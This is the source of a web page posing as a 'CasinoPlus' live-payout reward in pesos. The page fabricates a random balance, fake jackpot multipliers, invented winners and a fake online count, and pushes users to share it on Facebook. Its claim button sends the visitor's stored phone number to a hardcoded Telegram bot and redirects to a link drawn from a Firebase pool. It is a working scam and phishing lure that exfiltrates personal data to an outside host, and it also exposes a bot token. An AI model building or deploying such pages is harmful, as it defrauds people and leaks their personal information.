<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Live Payout</title>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">

    <style>
        :root { 
            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); 
            --dark-bg: #04070d; 
            --glass: rgba(255, 255, 255, 0.05);
            --border: rgba(212, 175, 55, 0.3);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: 'Public Sans', sans-serif; 
            background-color: var(--dark-bg); 
            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); 
            color: #fff; display: flex; flex-direction: column; align-items: center; 
            min-height: 100vh; padding: 15px; overflow-x: hidden; 
        }

        .live-winner-box { background: rgba(0, 0, 0, 0.7); padding: 8px 15px; border-radius: 50px; font-size: 11px; margin-top: 5px; border: 1px solid var(--border); min-width: 220px; text-align: center; }
        #winnerEntry { transition: all 0.5s ease; display: inline-block; }

        .card { background: var(--glass); width: 100%; max-width: 380px; padding: 25px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(15px); text-align: center; margin-top: 10px; }
        .logo-img { width: 140px; height: auto; margin-bottom: 20px; }
        
        .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 20px 0; }
        .card-wrapper { cursor: pointer; position: relative; display: flex; justify-content: center; }
        .card-img { width: 100%; max-width: 100px; transition: 0.3s; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }
        .card-disabled { filter: grayscale(1) opacity(0.2) !important; pointer-events: none; }

        /* MULTIPLIER & JACKPOT */
        .floating-mult { position: absolute; top: -10px; color: #fbbf24; font-family: 'Orbitron'; font-size: 26px; font-weight: 900; animation: floatUp 1s forwards; z-index: 10; text-shadow: 0 0 10px #000; }
        @keyframes floatUp { 0% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-50px); } }
        
        .jackpot-text { position: absolute; top: -20px; color: #ff0000; font-family: 'Orbitron'; font-size: 30px; font-weight: 900; text-shadow: 0 0 15px #fff; z-index: 20; animation: jackPop 1.5s forwards; }
        @keyframes jackPop { 0% { transform: scale(0.5); opacity: 0; } 20% { transform: scale(1.5); opacity: 1; } 100% { transform: scale(1); opacity: 0; } }

        .amount { font-family: 'Orbitron'; font-size: 40px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 10px 0; }
        .timer-box { font-size: 13px; color: #fbbf24; font-weight: 800; margin: 15px 0; min-height: 20px; letter-spacing: 0.5px; }

        .btn-group { display: flex; flex-direction: column; gap: 12px; width: 100%; }
        .share-btn { background: #1877f2; color: #fff; padding: 18px; border: none; border-radius: 15px; font-weight: 800; display: none; cursor: pointer; box-shadow: 0 4px #1052a8; text-transform: uppercase; }
        .pay-button { background: var(--gold); color: #000; padding: 18px; border: none; border-radius: 15px; font-weight: 800; display: none; cursor: pointer; box-shadow: 0 4px #8b6508; text-transform: uppercase; }

        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .spinner { width: 50px; height: 50px; border: 5px solid rgba(212,175,55,0.2); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div style="text-align:center; margin-bottom:10px;">
        <div style="color:#22c55e; font-size:10px; font-weight:800;">● <span id="userCount">92</span> ONLINE</div>
        <div class="live-winner-box">
            <span id="winnerEntry">Initializing Secure Link...</span>
        </div>
    </div>

    <div class="card" id="mainCard">
        <img src="images/logo1.png" class="logo-img">
        
        <div class="game-grid">
            <div class="card-wrapper" onclick="handleTap(this, 1)"><img src="images/img1.png" class="card-img"></div>
            <div class="card-wrapper" onclick="handleTap(this, 2)"><img src="images/img2.png" class="card-img"></div>
            <div class="card-wrapper" onclick="handleTap(this, 3)"><img src="images/img3.png" class="card-img"></div>
            <div class="card-wrapper" onclick="handleTap(this, 4)"><img src="images/img4.png" class="card-img"></div>
            <div class="card-wrapper" onclick="handleTap(this, 5)"><img src="images/img5.png" class="card-img"></div>
            <div class="card-wrapper" onclick="handleTap(this, 6)"><img src="images/img6.png" class="card-img"></div>
        </div>

        <div style="font-size: 10px; color: #aaa; letter-spacing: 2px;">VIRTUAL BALANCE</div>
        <div class="amount" id="balanceText">₱0.00</div>
        
        <div class="timer-box" id="statusLabel">Generating your initial reward in <span id="timer">5</span> seconds...</div>

        <div class="btn-group">
            <button class="share-btn" id="shareBtn" onclick="doShare()">Share to Facebook (+₱50.00)</button>
            <button class="pay-button" id="claimBtn" onclick="doClaim()">Withdraw via GCash</button>
        </div>
    </div>

    <div id="processingOverlay">
        <div class="spinner"></div>
        <div style="color:#fff; margin-top:20px; font-weight:800;">ESTABLISHING VIALINK...</div>
    </div>

    <script>
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const userPhone = localStorage.getItem("userPhone") || "Guest";
        
        let balance = 0;
        let clicks = 0;
        let canTap = false;
        // Bagong Range: 100 - 1000
        const startBalance = Math.floor(Math.random() * (1000 - 100 + 1)) + 100;

        window.onload = () => {
            let timeLeft = 5;
            const timerDisplay = document.getElementById('timer');
            
            // Animation ng balance mula 0 hanggang startBalance sa loob ng 5 seconds
            animateValue(0, startBalance, 5000);

            const countdown = setInterval(() => {
                timeLeft--;
                timerDisplay.innerText = timeLeft;
                if(timeLeft <= 0) {
                    clearInterval(countdown);
                    balance = startBalance;
                    canTap = true;
                    document.getElementById('statusLabel').innerHTML = "✨ Initial Reward Granted! Tap cards for bonus.";
                    document.getElementById('statusLabel').style.color = "#22c55e";
                }
            }, 1000);
            
            startLiveWinners();
        };

        function handleTap(el, id) {
            if (!canTap || clicks >= 6 || el.classList.contains('card-disabled')) return;
            
            clicks++;
            el.classList.add('card-disabled');
            
            const rand = Math.random() * 100;
            let mult = 1;
            let isJack = false;

            // Multiplier Logic
            if (rand <= 10) { mult = 10; isJack = true; } // 10% Jackpot
            else if (rand <= 20) { mult = 4; }
            else if (rand <= 40) { mult = 3; }
            else if (rand <= 60) { mult = 2; }
            else { mult = 1; } // 80% (x1)

            const added = 25 * mult;
            const nextBal = balance + added;

            if (mult > 1) {
                const effect = document.createElement('div');
                if (isJack) {
                    effect.className = 'jackpot-text';
                    effect.innerText = "JACKPOT x10!";
                    confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#ff0000', '#ffd700', '#ffffff'] });
                } else {
                    effect.className = 'floating-mult';
                    effect.innerText = `x${mult}`;
                }
                el.appendChild(effect);
                setTimeout(() => effect.remove(), 1200);
            }

            animateValue(balance, nextBal, 400);
            balance = nextBal;

            if (clicks === 6) {
                setTimeout(() => {
                    document.getElementById('statusLabel').style.display = 'none';
                    document.getElementById('shareBtn').style.display = 'block';
                }, 1000);
            }
        }

        function doShare() {
            window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank');
            setTimeout(() => {
                const bonus = 50;
                animateValue(balance, balance + bonus, 500);
                balance += bonus;
                document.getElementById('shareBtn').style.display = 'none';
                const claimBtn = document.getElementById('claimBtn');
                claimBtn.style.display = 'block';
                claimBtn.innerText = `CLAIM ₱${balance.toLocaleString()}.00 NOW`;
            }, 1500);
        }

        function doClaim() {
            document.getElementById('processingOverlay').style.display = 'flex';
            const msg = `🔔 [ViaLink] CLAIM: ${userPhone} | ₱${balance}`;
            fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);

            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
                if (snapshot.exists()) {
                    const id = Object.keys(snapshot.val())[0];
                    const url = snapshot.val()[id].url;
                    db.ref('links/' + id).update({ status: 'pending', user: userPhone });
                    setTimeout(() => { window.location.href = url; }, 2000);
                } else {
                    alert("Reward Limit Reached! Try again later.");
                    location.reload();
                }
            });
        }

        function animateValue(start, end, duration) {
            let startTimestamp = null;
            const step = (timestamp) => {
                if (!startTimestamp) startTimestamp = timestamp;
                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
                document.getElementById('balanceText').innerText = "₱" + Math.floor(progress * (end - start) + start).toLocaleString() + ".00";
                if (progress < 1) window.requestAnimationFrame(step);
            };
            window.requestAnimationFrame(step);
        }

        function startLiveWinners() {
            const winnerBox = document.getElementById('winnerEntry');
            setInterval(() => {
                winnerBox.style.opacity = '0';
                winnerBox.style.transform = 'translateY(-10px)';
                setTimeout(() => {
                    const prefixes = ["0917", "0915", "0998", "0966", "0927", "0939", "0945", "0916"];
                    const pref = prefixes[Math.floor(Math.random()*prefixes.length)];
                    const suffix = Math.floor(1000 + Math.random()*9000);
                    const amt = [350, 800, 1500, 2400, 4500][Math.floor(Math.random()*5)];
                    winnerBox.innerHTML = `User ${pref}***${suffix} claimed ₱${amt.toLocaleString()}`;
                    winnerBox.style.opacity = '1';
                    winnerBox.style.transform = 'translateY(0)';
                    document.getElementById('userCount').innerText = Math.floor(Math.random()*15)+80;
                }, 500);
            }, 4000);
        }
    </script>
</body>
</html>
